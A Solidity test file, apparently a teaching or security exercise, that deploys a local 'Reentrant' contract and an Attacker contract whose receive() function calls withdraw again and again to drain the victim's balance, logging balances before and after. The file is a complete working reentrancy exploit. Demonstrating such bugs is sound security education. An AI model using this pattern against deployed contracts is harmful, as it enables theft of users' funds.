pragma solidity 0.8.11;

import "../../lib/ds-test/src/test.sol";
import "../contracts/Reentrant.sol";
import "./VM.sol";
import "./Console.sol";

contract TestReentrant is DSTest {
    Attacker attacker;
    Reentrant reentrant;
    VM vm = VM(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  

    function testAttack() public {
        // deals 1 ether to the attacker contract
        reentrant = new Reentrant();
        attacker = new Attacker(address(reentrant));

        vm.deal(address(attacker), 1 ether);
        console.log("attacker balance start: 1 eth");

        vm.deal(address(reentrant), 100 ether);
        console.log("victim balance start: 100 eth");

        console.log(address(reentrant));
        console.log(address(this));

        attacker.attack();
        console.log("attacker balance end: ", address(attacker).balance);
        console.log("victim balance end: ", address(reentrant).balance);

 
    }
}

contract Attacker {

    Reentrant immutable victim;
    address tester = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;

    constructor(address _victim) {
        victim = Reentrant(payable(_victim));
    }
    

    // this function starts the attack
    function attack() public {
        victim.pay{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    // This function performs the reentrancy
    receive() external payable {
        // keep withdrawing this contract's "balance" from victim 
        // until victim doens't have enough
        //console.log(address(victim).balance);
        if(address(victim).balance > 1 ether) {
            victim.withdraw(address(victim).balance);
        } 
    }

    
}

